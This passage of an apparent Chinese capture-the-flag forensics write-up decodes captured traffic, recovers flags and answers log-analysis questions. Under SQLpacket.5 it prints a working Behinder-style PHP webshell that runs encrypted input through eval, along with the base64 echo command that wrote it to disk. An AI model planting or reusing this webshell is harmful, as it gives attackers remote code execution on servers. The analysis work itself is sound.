jcyNjU2NDU0NDk2RjZFMkZFRkJGQkQ0NjQ0MzUyQjU1NkE3NjY3MzA1OTRDRUZCRkJENEQ1QTVBNUE0QzQ5Mzc0NDczNTk0NEVGQkZCRDQ0NUEyQjQ3NjI0NzVBNjY2MzY0NzNFRkJGQkQ2Rjc5NjkzOTcwNDM2NjRDNTQ0ODY1RUZCRkJENTc1MzU0NEM3MDU0NDQ3MjM1NzEzOEVGQkZCRDRENTg2MTU4Njk3MTU3MzM1ODY4NkZFRkJGQkQ2QzZGMzQzNTc3Njg1NjU4NTE2NTQ0RUZCRkJENTYzODZEMkY3MjcxNzc2NTM3NjI1QUVGQkZCRDU5NTY0QjYzNjczMzM1Mzg0Mzc1NjVFRkJGQkQ2NDM3NjM2NDc0Nzg3NTY1NkE3MjU0RUZCRkJENkU2NjRCNTc2NzQxNDQ1MTQ5NDI3NkVGQkZCRDZENDMzMDM1MzQ2MTY4NzczODQ3NTFFRkJGQkQ0RjM4NEYzOTU3MzA2MzQ4NjEzNjVBRUZCRkJENTQ3NjM2NDI2ODRGNDk3ODM5NTk2RkVGQkZCRDYxNTk0QzZBNDE1NjQxNkI3MTY2MkZFRkJGQkQ2OTUwNEI0MzdBNzM1MzczNTg2NjQ1RUZCRkJENkI2RTY0Nzk1NjU2NEI0MTU0NDE2RkVGQkZCRDY3NEM0QzY3Mzg0NDUzMzY3NjM2NzNFRkJGQkQ3NTRDMzk0MzRGNzQ2QzMyMzM0RTJCRUZCRkJENTU2MzY4Njc1Mzc3NkQ0QjY1NEM3MEVGQkZCRDcxNjg1NDQyNzg2ODRGNDE0RDU4NTlFRkJGQkQzODc0NzM2RjY4NkE0Rjc1NjU2MTc5RUZCRkJENkQzMDY0NEQ2ODc0NEQzMjJCNzE3MUVGQkZCRDVBMzg1NzQ2MzA2MTYxNDQ2QjQ0NDZFRkJGQkQ1OTY3NzczMTM0NjU3ODUzNzQ3MTUwRUZCRkJENTk3MDRFMzI3MTMyNzk0QzQ3Mzk0QkVGQkZCRDYxNjI2NzMwNTU2RTZDNzA3NTRDNDJFRkJGQkQ1ODYzNTc1MjRFNTM0QjY4NTM0RjM0RUZCRkJENEM1MTMxNDQ3NTUzNzk0OTY4MzQ1M0VGQkZCRDY4MzY2RTcwNTg0OTZGNkY2Qzc3MzVFRkJGQkQ2MTMwNUE0NjJGNDg1OTQ4NDk2OTUzRUZCRkJENjU0NTcxNDM0QTJCNTk1OTUyNTIyRkVGQkZCRDc5Nzk0RTRGNEE2OTUxNzM2RTZBNDlFRkJGQkQ1MzM0NjczMzM2MzI0QjU0NTc1NTdBRUZCRkJENTk3NTQ5NTgyQjc5NzUzMzJCMkI2NDdGNDU2MTRENDY0ODRBNjg3MjMwNzI3NEVGQkZCRDYzNzQ1NDREMzI3NzQxMzA3MDQ3NDZFRkJGQkQ0ODY5MkI1NzQyNzAzNTMzNjczNTQxRUZCRkJEMzA2QjQ4NkE2NDU3NDI2QTY4NDg2OUVGQkZCRDdBNDI3NTMyNDg2QzMxNTY0MTYyNDZFRkJGQkQzNTRCNTk2RTYxNTc0QTMyNDY3NTVBRUZCRkJENjczMTZCMzY1QTQ0NzE1NDZFNjU3OUVGQkZCRDUyNjc1MzRDNkU2QzQ4NEM3QTc1NzRFRkJGQkQ0ODQyNTIzMTc2NDQ0QjcxMzM1NzM1RUZCRkJENTA1QTUyNTM2OTM1MzM1OTQ5NTM3M0VGQkZCRDcyNjk3QTZENjY1MDdBNzA0QjU3NzNFRkJGQkQ3MzMzNzM2NjcyMzY0MjMwMzkzNTU0RUZCRkJENTU1MTJGNjQ1Nzc0NTIzOTM1NzI1NkVGQkZCRDVBNTkzOTY4NDQzNDQ1NEUzMjU2MzFFRkJGQkQ2NjRCNDg1MjU3NzkzNTRENEE1MzRFRUZCRkJENkMzODRENTQ0Nzc2NjM0NTU0NkUzMEVGQkZCRDRENEQ1OTRFMzg0RDQ4NUE2MTU0NjdFRkJGQkQ0NTcxNDIzMDM0MzE2ODRBNkMzMjU0RUZCRkJEMzc0MjQ0NTA2ODc5NEU2RjM0NzA2NUVGQkZCRDU1NTczOTZFNTk1NjRCNDU3NzQxNjVFRkJGQkQ0NjQzNEQ3MzQ1NDU0OTU2NzQ3ODM2RUZCRkJEN0E0Nzc4NTY1ODY0NjM3MjM1MzU0RkVGQkZCRDM5NDE2RjMxNjI3MDcxNjY0NDQxNjFFRkJGQkQzNjMzNzUyQjY5N0E2NTQxMkI1OTMxRUZCRkJEMzU1OTY1NTU2MTUzNzkzNTdBNjc2M0VGQkZCRDdBMzgzMjY4NTM0MjZGMzA2QTMzMzdFRkJGQkQ2NzM5NDM3ODM1MzM3MDM0NzUyQjRCRUZCRkJENkU3QTY1NEY2NTM1NTE2NjQ3NEEzMkVGQkZCRDQ4NDI1OTU4NjE2MjQyNjQ3MzUyNDFFRkJGQkQ0NzQ5MzI2OTM4NzQzNjZENEY3ODc0RUZCRkJENTI3ODVBNDY0RDQ5NkE2NzMyNEY0RkVGQkZCRDY5NDI0MTRENDE2MTRFNjU1MTU2NzhFRkJGQkQ2RDRCNkM1MjQzMzk1NDc5NTE2MjM1RUZCRkJEN0E0NDQzNzI2ODRFNzk0MTZEMzA2MUVGQkZCRDc5NkM3QTU5NDY2ODYxNjM2QzQ1NDJFRkJGQkQ3ODcwNkMzMjY0NkU1NzY1NTM0NjQzRUZCRkJENTE2ODMxNDM0Njc0NUE1QTMwNzA0OUVGQkZCRDQ0Njc2NTU3NkI0Rjc2Njk0RTZFMzhFRkJGQkQzMTc0NEI0ODQxNzg2NTc4MkI2NzczRUZCRkJENDk2MzY3MzI2RjY1NzA1OTMwNzUzMUVGQkZCRDRDNTYzMDQzNkQ2RDU1MzQ2Nzc5MzdFRkJGQkQ1MTczNjc2QTcyNEI0NDc2MzM3NzY3RUZCRkJENzk0RTY0NjEzMjZENjkzMzZFNEQzMkVGQkZCRDYxNEY1MzU3NzA2NDRGNDQyQjJGNDlFRkJGQkQ1MDQ5NTA2NDc1NkE3MTc4NDUyQjUzRUZCRkJEN0E2ODc5NTk1NzVBNjM0QjQ4N0EzOUVGQkZCRDUxNEQ2RTUzMzg1OTQyNDE0NjUyNDhFRkJGQkQ0NjRDMzEzNjYzMkI3QTJGMzU0NTY5RUZCRkJENDIzODQ1Nzk0RjQ5NkQ3MDM3MzkzM0VGQkZCRDYxNTE3MjUyMzc2RjZDNzk1QTc3NEVFRkJGQkQ3MjZFMzM1MjZCNkY0ODRGMzY2NTYxRUZCRkJENDQ3MTM4NzE2RjZFNEQ1MzQ0NzYyQkVGQkZCRDRENkM1NDUxNjk1MjcyNjc2QzUyNkRFRkJGQkQ2MTRBMkI1NTU1Mzg0QjUyNTY1MzJGRUZCRkJENkU2NzMzNzA3MjczNjk1MDU1NjU2MUVGQkZCRDU1Njk1ODc5NjQyQjYxMzc2MTc3NjJFRkJGQkQ2RjRBNTIzMTYyNDc1NDUzNzMzNzY5RUZCRkJEMzczNjU5NEEzNTYzMzM2NDc3NzQ1QUVGQkZCRDMzNkY0QjRDNTA2RTQxNEM0Mjc5N0FFRkJGQkQ3MjM1MzY2NjZENjk0RTUxNkQ1NTY1RUZCRkJENDk1Mzc1NkUzMTM2NDU3ODQ5NzkzNUVGQkZCRDczNzg3OTc4NEE2RjYzNEE1NTQ2NkZFRkJGQkQzMTZGMzQ0QjcxNjM3OTQ3NDk0QTQxRUZCRkJENTcyQjY5NzE3Mjc0NjIzMzc0NkQ1NkVGQkZCRDRENkI3MzY3NEY0NjY1NzE0QTQzNTZFRkJGQkQ1OTU3NzE3NTcyNTE0NTZENzg2RTc1RUZCRkJEN0EzNjZENzg1MjRGNkM0NjM1Mzc3MUVGQkZCRDM4NDQ3NzdBNzY3NDc4Nzc0MjU1MkJFRkJGQkQ0OTM2MkIzNzYxNzY0OTU4NDM1MDYxRUZCRkJENkQ0NzYzMzg0MjZGMkY1OTc2NzQzMkVGQkZCRDQyNEQ2MzdBNzY1MTRDMzA3QTQ2NThFRkJGQkQ0OTQxNjkzNjU5NzU1MTU1NDI3ODU1RUZCRkJENzMzNzc5NjM1MjYyNkQ3MzYyNzg2QkVGQkZCRDY2NkQ2NDc2NTQzMTRBNzc1NDY0NTNFRkJGQkQ2NTZBNUE0RDM2NjQ0MzM5NTA0QjYxRUZCRkJENjg1OTU3Nzc1NzY4NzIzNjY0NEIzMkVGQkZCRDUxNDE3MDM2NjE0NjZGNTg0RTc4NjhFRkJGQkQ1NDRCMkY1ODQ5NkY2MTJGNDkzNzZFRUZCRkJENUE2NzcxNTM1MjZFNDY0ODc3Njk2QkVGQkZCRDY3MzY3MzZDNkI0RTc0NTI2NjQ2NkZFRkJGQkQyQjM0MzQ2QjMwNzY1OTc0NTM3MDRBRUZCRkJENzI1NDU0NEQzNzQyNTk3Mzc4MzE1M0VGQkZCRDU5NTc0QTYxNDc2ODM0Mzg3MjM3NjVFRkJGQkQ0RTZCNzM2NDYxNjQ0QTQyNDc1NjM3RUZCRkJENTM2RDZEMkI2MTZCNDE0OTU3NEQzNEVGQkZCRDRGNkU2NTMyNEY0MTczNkU0MTJCNjhFRkJGQkQ0ODc1Nzk0ODZGNTAyQjQ2NTA2ODczRUZCRkJENEI2MzQ2Njc0MzRGNDQ0ODczMkI2MUVGQkZCRDZBMzUzNTUzNjY0MjU0MzQ1MTYzNERFRkJGQkQ2QzQ2NzU3MDQ5NzQyQjc4MzE0Qjc5RUZCRkJENzg0QzQ1NDg0RTM5MkI2Mzc5NzEyQkVGQkZCRDQ4NDE1NDdBNTIzMjUyMzU1MDYzMzJFRkJGQkQ0NjM3NDM2NDZFNDc0RTcwNjk0RTc2RUZCRkJENzU1MDRCNDUzMDcxNjczMDQyNzk0NkVGQkZCRDc4MzI3NDU4NkMzMTY0NzAzNjQ0NDFFRkJGQkQ2OTMyNkQzOTUxNEYzNDZBMzgzNTZERUZCRkJENjQ1NDY0NzY1QTYyMzU2QzM1NzU3NEVGQkZCRDY4NzU0RTMzMzI2RTZFNTk3NzY5NjJFRkJGQkQ2NzUzNzM1NzZBNzk1MzMyNjE0ODQ2RUZCRkJENzQ3MTM4NDM0NzQ1NkY0OTRFNTg2MUVGQkZCRDc3MzM1MDUwNzM3OTRGMzQzMDRENzBFRkJGQkQyQjY2MzU1NDZBNEI1NzM0NDk3MzQ1N0Y2ODRCNTk1NTM5NjM1NTYyNjczNzRERUZCRkJENjE0NTJGNkQzNDZGNzA1ODMzNjczNEVGQkZCRDMyNjUzODU0NTAzNTUwNjI0NjczNTRFRkJGQkQ1OTQ2NjkyRjM5NTU0RDM2NTE2RTUyRUZCRkJENkQ0RjU3NkU0RDQ5NDU3QTY5NzA1MUVGQkZCRDQyNDQ0MjUyNzg0RTU5NTE0MjU1NDVFRkJGQkQ0RjRBNzUzNjJCNDQ2RjM0NzM2NzU2RUZCRkJEMzE3MjZENDYzMzZBNDI2NTRGNTUzMEVGQkZCRDY0MzU0QTc1NEM0MTYzMzU0NjY3NzhFRkJGQkQ2NjY1NkIzNDRCNjEyQjc3Nzg3ODRDRUZCRkJENDc2Mjc2MzQ2MzQ3NTI0MTZENDM3OEVGQkZCRDY5NDEzMTRCNzg0MzZCMzI3MDM4NzdFRkJGQkQ0NTRBNDM2OTZFNDU0RjM1MkI2RTcwRUZCRkJENzc1NTM5NDk0NjYxNzAzMzU1NDk2Q0VGQkZCRDUwMzQ2RTM1NEM0RjZBNDM0QjY5NjRFRkJGQkQ0QTQzNDM2NDZBNTM1MTRDNTI0RTRDRUZCRkJEN0E0MzczNTM0RTUxNDg2NTc4NzMzN0VGQkZCRDMwNDEzNDQ5NjI1QTZFMzc0RjcwNjVFRkJGQkQ2QTU2NTU3OTRGNTg2RjQ1Nzk0QjU2RUZCRkJENTA0NzJCNUE1ODY0NDc3MTc2NTE2QkVGQkZCRDU0NDg3NDQ4NzY0MTM3NTA0NzYzNjM3RjcxNzM0RjZDMzE3MTRENDI2QTc3NERFRkJGQkQ3NTQ4NjU3NzU2Mzk3NjU4NjEyQjMwRUZCRkJENkUzNDUxMzM0RTVBNTMzODQ0NzA0QUVGQkZCRDc4MzMzNTU4NTA1MjU3NDY2MTM4MzhFRkJGQkQ2Qjc4MzczMDQ0Nzc0RTc4NTA0MTQyRUZCRkJEMzg0NzRBMzM1QTY5NDk3ODVBNkMzMEVGQkZCRDQ4Njk2OTY5N0E3MDYxNEI3ODY0NkRFRkJGQkQzMTQ3NjE1ODRBMzI2NTMwNDE3NjU5RUZCRkJENTg0RTQxNkM2RjU1NzI1MjRCNUE2NkVGQkZCRDYzNkM1NTUxNEI2ODU1NjMzOTc2NzNFRkJGQkQ0NzRDNTg0NTU2NDk2MzY5NTk1MDQ0RUZCRkJENTAzNjZENTI3NDRENTQ3MjY2NjE1NUVGQkZCRDc1NDk1NzQ1Njg3MzQ1MzIzMjY5NjhFRkJGQkQ2NTMzNzg1MjQ4NTM2QjZCNEQ2RDZDRUZCRkJENzY0MjUyNTc3OTM0MzU1NzZBNkU1N0VGQkZCRDY0NTg3NDcwNDMzODYyNjQ2QTQ0NDVFRkJGQkQ2RTQ2NDc2QzQ1NzY3MzcwMzA2MzQ0RUZCRkJENEU1MzZFNkY2RTQ2NDMzOTM1N0E2MkVGQkZCRDczNjM2NTU5NkQ3ODU0NTc3MDM2NjlFRkJGQkQ2RTZFMzE0RDcyMzM1ODUxMzM3MzY4RUZCRkJEMzI3NDM3MzI3NDM0NDM2QTcxNzc0RUVGQkZCRDMzNjg2QjU5Nzk3NTYzNDE1QTc4MkJFRkJGQkQ2NzY5NDEzNDUwNEU1NDQ1NEQ1ODUxRUZCRkJENDQ2NjQ0NzE2MTM5N0E2RjU5NDc2M0VGQkZCRDQ2NEE3NjMzNzI3NDU3NkI3MDRGMzFFRkJGQkQ2NDM0MzY2MjZFNkQ3OTc2MzA0QTU4RUZCRkJENEU3NDU0Nzg3ODREMzk0RjYxNDQ0NkVGQkZCRDU5Mzk0RTU5NDY2QTZBNEM1NzZGNDdFRkJGQkQ0NjcxNjM1QTZBNTIzOTc2NjU3QTZGRUZCRkJENTk3NTQ5NzczMzJGNEM2Mzc3NDU2OEVGQkZCRDYzNEM3NjU3NEM0QTZFNDM3MjJCNEFFRkJGQkQ0QzczNzE2QTMyMzA2MzczNTA0QjU1RUZCRkJENzY2Qjc3NzQ0QzZCNTM0RjRENEY1OEVGQkZCRDJCNzczMzcyNTQ1NTY3NzA3MzY3NDlFRkJGQkQzMTU3NTk1OTQyNjU1NDYzMzEzNjcyRUZCRkJENjEzODYxNTU2ODYxNjI3OTRFNTA3OEVGQkZCRDQyNEU1NTRBNkE2NzU4NDgzMjZBNEZFRkJGQkQ3ODc2NjUzMDcxN0E1QTM4Mzg0QzUzRUZCRkJEMzk1MDQzNjYzODRGMzE0OTRGNDE0QzdGNDY3Mzc0MzI3ODU5NDI1QTY3NjI2MUVGQkZCRDM0Mzc2NTQyNzk0MzYyNEE0OTUyNzJFRkJGQkQ1OTZCNjQ2QzYzNTc2Qjc3NDc2OTRFRUZCRkJENTE2NzM0NEE3Mzc1MkI3MjZCNzg3MkVGQkZCRDM4NkU1OTUxNkE0NTRENEE2MTZFMzBFRkJGQkQ2MTcyNjM2MzU2NDU0RjM4NEU3MzU2RUZCRkJENDI1OTZDMzA3ODQzNDEzNTUxNzE0RUVGQkZCRDZDNUE1ODQyNzc0MzQyNDk3MjQyNjlFRkJGQkQzODY4Nzc2MzYxNEY0ODJCMkIzMTM1RUZCRkJENEEzNjY5NDY0OTQzNTc2RjU1NjU2NkVGQkZCRDczNjIzNzMxNjU0RTY2NkE3NTQ0NkVFRkJGQkQ3MTM3MzU2NDMyNzEzODZBNDM2NjczRUZCRkJENzk0NTRBNkY0NTYyNDM3NTZGNzQ3NjdGMzU0RTc2NjczOTc2NkE0MjQ2NkQ3MEVGQkZCRDY0NEM2RjYyNDQzMDM5MzUzMTRCNzJFRkJGQkQ2NDM0NjM0NDY0NjQ0QzM2Nzg0MTQxRUZCRkJENTE0RDM1NkQzMzU1MkI0RDU4Mzk0M0VGQkZCRDZGNEM0MzcyNTI0QTRGNDc2MjY2NzZFRkJGQkQ2OTQzNzQ0QTZBMzc3MzU0NjU1QTQxRUZCRkJENTk1NzRFMzM3NDY1NEM1MjY1Nzc0OEVGQkZCRDY5MzY2NDM2NjY2OTQ0NkQ2QjM2NThFRkJGQkQ3MTRCNTU2Nzc1NTkzODZDMkI2QTU1RUZCRkJEMzE1OTM2NDk1Nzc5NTc1QTU3NjE3M0VGQkZCRDRFNDk0QjM3MzMzMDcyNTU2RjRGNDlFRkJGQkQ1MjQ5NkIzMzY4NTczNzMyNDU0RDQ1RUZCRkJEMzM0MTc4NzEzNjUwNTY3NzY2MzQ2N0VGQkZCRDU1NDE0NjcxNzI2RTUzNjM1MDU3NDJFRkJGQkQ1MzMxMzQ2NzU3Mzg3MDUzNDM3OTZBRUZCRkJEMzMzNDc0NDg1NDRENjk2MTY2NTU0OUVGQkZCRDZBNzQ1ODMxNDE1ODUxNjMzNzQ3MkJFRkJGQkQzODMzNzI3MzRCNjI3NTc3NzU0QzUxRUZCRkJEMzQ1ODY1NzU2MzY3NDYyQjM3NjkyQkVGQkZCRDM5Mzc2OTUxNkI1NjQ3NTM3NDQzNkNFRkJGQkQ1NTQ1MzE2MTZENjY2MjZENzA2RTUxRUZCRkJENTE3MzM3NEE2QzM4NzA1MjRCNkU2N0VGQkZCRDRGNTk2NDQ4NjQ0Njc0NTI1NzY0NTlFRkJGQkQ0QTZCMzY2MTM2NDg2MzM1MzY2NjZGRUZCRkJENzA1NDc5NTQ0NjM2NjM2QTMzNEU0NEVGQkZCRDQ5NDg1QTQ3Nzk0RTRGMzI0RjYzNTBFRkJGQkQ0RTMwMkI2RDczNUE0ODc5NzA1Mzc1N0Y2ODMyMzI2ODcxNEQ1QTZDNzM3NTZFRUZCRkJENTU0MzY0NzIzNjdBMzg2MzZENDc3NUVGQkZCRDY4NDUzNTQzNzE0NzU1NzA0OTQ2MzFFRkJGQkQ0QzczNTczNTY3NDc2RDdBNjc2RjRFRUZCRkJEMzkzMjZBNTQ0ODZDNEE2MzMyNDU2MUVGQkZCRDVBMzI0NTUyNjE0RDYxMkI0NTRBNzFFRkJGQkQ1NDY5NzgzNjZBNzQ0MjUyMzI1MjUyRUZCRkJENTU3MDM0NkM2QTQ4NjYzODQzMzczMUVGQkZCRDRGNTkzODMwNEY2MjZDNzE0NjVBMzlFRkJGQkQ0MjMyNzg1OTQzNkM1NzRFNzA1QTVBRUZCRkJENkM0ODQxNkUzMzY0NkYzOTRBNTc1N0VGQkZCRDU4NkYzNjc2NkE2MjcwNEU0MzU0NzJFRkJGQkQ3MjRGNzAzMzc0NTc0RTMwNkYzMTRDRUZCRkJENzIzMzZCNDY2RTc0NEE0RjZFNjIzMEVGQkZCRDU2NjQzNjRCNTU3ODcyNjMzOTM5NTRFRkJGQkQ1MjRGNDUzNzM4NEI3MzRCNzQ2OTc0RUZCRkJENkI2MTQ1NzIzOTJCNkU0QzUzNzk2RkVGQkZCRDc5NTQ1NDQ0Mzc2QTQ0NDU0MjMzNTc3RjY5Nzg1MTRFNDMzMjU4NjE1NDQ5NzlFRkJGQkQ2OTM2NEY0RjUwNTAyRjY4NkY2MzM2RUZCRkJENzY2MTMwNTA1ODZBN0E2MjRGNDg3N0VGQkZCRDRFNzUzNDMzNjU1OTY4NDMyQjY2NEVFRkJGQkQ3ODM1Mzk3MzQ4Njc1OTMzNzYzNDYzRUZCRkJENjY2Mjc2MzYyQjQzNjM0QTYyNTU2RkVGQkZCRDYyNTA3NTcyMzc3NDcxMzM3NDY0NjhFRkJGQkQyQjMyN0E0QTM1Mzg1MDQ4MkYyRjc2RUZCRkJEMzg3NDQ4NkQ3MzM4MzI0NDU4MzU1N0VGQkZCRDYyNkE3QTY2NDYzMzQ0NTYzNTM4NzJFRkJGQkQ2NjU2NEI0NTRGMkY2NjMwNjE1NDY2RUZCRkJEMkI0RDMxMzgyRjUzMzQ1NzUxNzU1N0VGQkZCRDc5NTI2QTcxNTE1NzQ4MkI0RTUwNTNFRkJGQkQ0NDYxNUEzNDMxNjcyRjM3NTQ2NTRCRUZCRkJENzA2NDQ4MzU0QzYzMzE2RTY0NTkzN0VGQkZCRDMzNzc0QjJCNjQ2QjZEN0E0Qzc2NzdFRkJGQkQ0QjU4NTk1MzUwNzY3NTQxNjE2NDc1RUZCRkJENzEyRjU3NDQ3QTZDMzAzMDU1Mzk2QkVGQkZCRDcyNTk2NDU3MzQ1NTUwNzY3Njc3N0FFRkJGQkQzNzQzNjY2Njc2NEM1ODU0MkI3NTM0RUZCRkJEMzM3NDdBNEM0Qzc1Nzk2NjUwNjY3QUVGQkZCRDM3Mzg2NTQ1NjY2NjdBNzcyQjY2NTBFRkJGQkQ0ODM2Mzc2NTUwNDQzODJGMkIyQjU4RUZCRkJENkY3NDY2NjY2Njc2N0E0NDc5Mzg2NUVGQkZCRDQ4MkYzNzM1MzIzOTYzMkYyRjY2NjhFRkJGQkQyQjYyNjY2RTc1MzYyRjY1MkY3NjMxRUZCRkJENzQ2Mjc2MkY3Mjc0Mzc1NzJCNzYzM0VGQkZCRDcyMzczNDM1NzY0ODY4MkY2Mzc2NThFRkJGQkQ0QzMxMzkyQjJCMkIzOTY2NTg3QTM0RUZCRkJEMkIyRjUwN0EzNjM4MkI2NjJGMkY2NkVGQkZCRDQ4MzMzNTM2MkIyRjY2NDg3QTM0MzRFRkJGQkQzNDczNTg2MjM5MkYzODM4NjYzNjYyRUZCRkJENTYyRjM5MzYzODJGNkE3NzM5NzU3NkVGQkZCRDc2NjY2RTcyN0EzNDMxNzI3QTM1NTNFRkJGQkQzODJGNTA2QTM1MzgyQjY1MzYzNzM5RUZCRkJEMzczOTM4MkYyRjRDMzUzOTMxMkIzOUVGQkZCRDJCNzY3QTZFNzgzNDY1NTg3NjM3MkZFRkJGQkQzNDM4NzA3NDc2NjYyRjM3NzAyQjU0RUZCRkJEMzk2NjJGNjY1NDM5MzY3QTU4NDc3MkVGQkZCRDMzMkIzODY1MkY2RTRDNEUzNTM5MkZFRkJGQkQyRjJGMzc1NjQ0MzIyRjY2NzI0MTM3RUZCRkJENjY2Njc2NDg3MjZEMzMyQjM4NjU1MEVGQkZCRDY1NjY2NDMyMzkyRjY1NjYzMzQ0MzJFRkJGQkQyRjJCMzgyQjJGNDM2QTU0N0EyRjM1RUZCRkJENDgzNzJCNEUzMDQ2MzQzREVGQkZCRDI3MjkyOTI5M0IyMjJDMjJFRkJGQkRFRkJGQkRFRkJGQkQwRDBBRUZCRkJERUZCRkJERUZCRkJERUZCRkJEN0ZFRkJGQkQ2MjMzNjU2MjM0NjY2MzMzNjY2NTYyMzU2MzY1Mzk2MTM5NjI2NTYyMzUzMzMwNjIzOTMxNjM2NTY2MzM2NjM5RUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJERUZCRkJEMjIyOTNCNzI2NTc0NzU3MjZFMjA3NDcyNzU2NTNCM0YzRTBEMEE3MzY1NjM3MjY1NzQzMTNENjE2NTMxMzYzOTMwNjEzMjJEMzg2NTM2MzcyRDM0MzIzMTY1MkQ2MjY0NjM2NDJENjMzNDM1MzEzMDM5MzkzNTY0NjEzOTM4</span><br></pre></td></tr></table></figure><p>base64解密之后hex得到flag</p><p>secret1=ae1690a2-8e67-421e-bdcd-c4510995da98</p><h3 id="SQLpacket-5"><a href="#SQLpacket-5" class="headerlink" title="SQLpacket.5"></a>SQLpacket.5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者上传的恶意文件文件名是(非php)（答案参考格式：1.py）</span><br></pre></td></tr></table></figure><p>首先tcp.stream eq 183流过程中看到上传了一个tmpbkxya.php</p><p>tcp.stream eq 187的时候可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo%20PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleT0iMDVjMWNjOWMyZGVhZmI3NSI7CgkkX1NFU1NJT05bJ2snXT0ka2V5OwoJc2Vzc2lvbl93cml0ZV9jbG9zZSgpOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Cj8%2B%20%7Cbase64%20-d%20%3E%20shell.php</span><br></pre></td></tr></table></figure><p>URL+base64解密得到shell.php的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">    $key=&quot;05c1cc9c2deafb75&quot;;</span><br><span class="line">        $_SESSION[&#x27;k&#x27;]=$key;</span><br><span class="line">        session_write_close();</span><br><span class="line">        $post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">        if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">                $t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">                $post=$t($post.&quot;&quot;);</span><br><span class="line">                for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">                             $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">                            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">                $post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">        &#125;</span><br><span class="line">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">        class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>得到一个key= 05c1cc9c2deafb75，根据特征判断是一个冰蝎的马</p><p>然后根据Content-Length:长度tcp.stream eq 201中找到一个最大的流量Content-Length: 39296保存里面的请求包为197.txt，使用<a href="https://github.com/melody27/behinder_decrypt#readme%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86">https://github.com/melody27/behinder_decrypt#readme工具进行解密</a></p><p>php decropt.php -k 05c1cc9c2deafb75 -f 197.txt</p><p>可以看到解密之后的关键信息包含</p><p>$mode=”Y3JlYXRl”;$mode=base64_decode($mode);$path=”L3RtcC9teXNxbDY2NjEyMy5j”</p><p>base64解密之后得到create和/tmp/mysql666123.c</p><p>所以文件名为：mysql666123.c</p><h3 id="BlueTeam-1"><a href="#BlueTeam-1" class="headerlink" title="BlueTeam.1"></a>BlueTeam.1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">小明在一个比较保守的公司上班，同事们只有一台可以用来干工作事务的机器，ip是192.168.13.128，虽然机器比较破旧，但是大家也尽可能的在上面进行自己的正常工作。有的同事甚至会从另一个未被隔离的机器上进行远程登录，从而无需走到这台放在机房的机器那儿。直到6月27号的晚上，他突然意识到事情可能变得复杂了。</span><br><span class="line">通过日志分析，哪个账号存在异常行为的操作导致了问题的产生？请提交该用户名字（首字母大写，答案参考格式：Admin）</span><br></pre></td></tr></table></figure><p>查看登录日志，尝试多个用户后发现是Ming</p><p>tcp 485流量能看到cookie</p><h3 id="BlueTeam-2"><a href="#BlueTeam-2" class="headerlink" title="BlueTeam.2"></a>BlueTeam.2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者最初进来的IP和端口是什么？答案请以md5(ip:port)的方式，例如攻击者进入的ip和port为127.0.0.1:80，则此时提交cef54f47984626c9efbf070c50bfad1b</span><br></pre></td></tr></table></figure><p>根据上一题筛选ming这个关键词，tcp 485，找到ip和端口</p><p>所以ip为192.168.13.1:3389</p><p>d32fc26cf25b0eafdb135cafa50e746a</p><h3 id="BlueTeam-3"><a href="#BlueTeam-3" class="headerlink" title="BlueTeam.3"></a>BlueTeam.3</h3><figure class="highlight 